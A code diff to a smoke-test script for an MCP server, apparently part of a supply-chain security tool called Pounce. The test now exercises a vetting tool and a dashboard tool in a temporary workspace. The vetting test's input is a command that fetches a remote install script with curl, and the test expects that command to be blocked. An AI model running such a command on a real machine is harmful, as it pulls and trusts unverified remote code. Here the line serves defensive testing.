@@ -7,6 +7,7 @@ import argparse
 import contextlib
 import io
 import json
+import os
 import subprocess
 import sys
 import tempfile
@@ -219,57 +220,86 @@ def run_installer_smoke() -> dict[str, Any]:
 
 
 def run_mcp_smoke() -> dict[str, Any]:
-    message_stream = "\n".join(
-        [
-            json.dumps(
-                {
-                    "jsonrpc": "2.0",
-                    "id": 1,
-                    "method": "initialize",
-                    "params": {"protocolVersion": "2025-03-26"},
-                }
-            ),
-            json.dumps({"jsonrpc": "2.0", "id": 2, "method": "tools/list"}),
-            json.dumps(
-                {
-                    "jsonrpc": "2.0",
-                    "id": 3,
-                    "method": "tools/call",
-                    "params": {
-                        "name": "pounce.vet",
-                        "arguments": {
-                            "mode": "release",
-                            "artifacts": ["curl https://sfrclak.com/install.sh"],
+    with tempfile.TemporaryDirectory() as workspace_dir, tempfile.TemporaryDirectory() as state_dir:
+        workspace = Path(workspace_dir)
+        (workspace / "AGENTS.md").write_text(pounce_runtime.agents_block_text(), encoding="utf-8")
+        (workspace / "package.json").write_text(json.dumps({"dependencies": {"demo": "1.0.0"}}), encoding="utf-8")
+
+        message_stream = "\n".join(
+            [
+                json.dumps(
+                    {
+                        "jsonrpc": "2.0",
+                        "id": 1,
+                        "method": "initialize",
+                        "params": {"protocolVersion": "2025-03-26"},
+                    }
+                ),
+                json.dumps({"jsonrpc": "2.0", "id": 2, "method": "tools/list"}),
+                json.dumps(
+                    {
+                        "jsonrpc": "2.0",
+                        "id": 3,
+                        "method": "tools/call",
+                        "params": {
+                            "name": "pounce.vet",
+                            "arguments": {
+                                "mode": "release",
+                                "artifacts": ["curl https://sfrclak.com/install.sh"],
+                            },
                         },
-                    },
-                }
-            ),
-        ]
-    )
-    completed = subprocess.run(
-        [sys.executable, str(SCRIPTS_ROOT / "pounce_mcp_server.py")],
-        input=(message_stream + "\n").encode("utf-8"),
-        capture_output=True,
-        check=False,
-        timeout=20,
-    )
+                    }
+                ),
+                json.dumps(
+                    {
+                        "jsonrpc": "2.0",
+                        "id": 4,
+                        "method": "tools/call",
+                        "params": {
+                            "name": "pounce.dashboard",
+                            "arguments": {"workspace": str(workspace)},
+                        },
+                    }
+                ),
+            ]
+        )
+        env = {**os.environ, "POUNCE_STATE_DIR": state_dir}
+        completed = subprocess.run(
+            [sys.executable, str(SCRIPTS_ROOT / "pounce_mcp_server.py")],
+            input=(message_stream + "\n").encode("utf-8"),
+            capture_output=True,
+            check=False,
+            timeout=20,
+            cwd=workspace,
+            env=env,
+        )
     if completed.returncode != 0:
         return make_check(
-            "MCP server exposes pounce.vet",
+            "MCP server exposes pounce.vet and pounce.dashboard",
             False,
             completed.stderr.decode("utf-8", errors="replace").strip() or "MCP server exited non-zero.",
         )
 
     responses = [json.loads(line) for line in completed.stdout.decode("utf-8").splitlines() if line.strip()]
     tools_list = next((item for item in responses if item.get("id") == 2), None)
-    tools_call = next((item for item in responses if item.get("id") == 3), None)
+    vet_call = next((item for item in responses if item.get("id") == 3), None)
+    dashboard_call = next((item for item in responses if item.get("id") == 4), None)
     tool_names = [tool.get("name") for tool in (tools_list or {}).get("result", {}).get("tools", [])]
-    structured = (tools_call or {}).get("result", {}).get("structuredContent", {})
-    passed = "pounce.vet" in tool_names and structured.get("verdict") == "block"
+    vet_structured = (vet_call or {}).get("result", {}).get("structuredContent", {})
+    dashboard_structured = (dashboard_call or {}).get("result", {}).get("structuredContent", {})
+    dashboard_text = ((dashboard_call or {}).get("result", {}).get("content", [{}])[0] or {}).get("text", "")
+    passed = (
+        "pounce.vet" in tool_names
+        and "pounce.dashboard" in tool_names
+        and vet_structured.get("verdict") == "block"
+        and all(key in dashboard_structured for key in ("generated_at", "workspace", "feed", "recent_verdicts"))
+        and "Pounce Dashboard" in dashboard_text
+    )
+    detail = dashboard_structured.get("workspace", {}).get("protection_status")
     return make_check(
-        "MCP server lists and executes pounce.vet",
+        "MCP server lists and executes pounce.vet and pounce.dashboard",
         passed,
-        structured.get("summary", "MCP tool call did not return a blocking verdict."),
+        detail or vet_structured.get("summary", "MCP tool calls did not return the expected data."),
     )
 
 
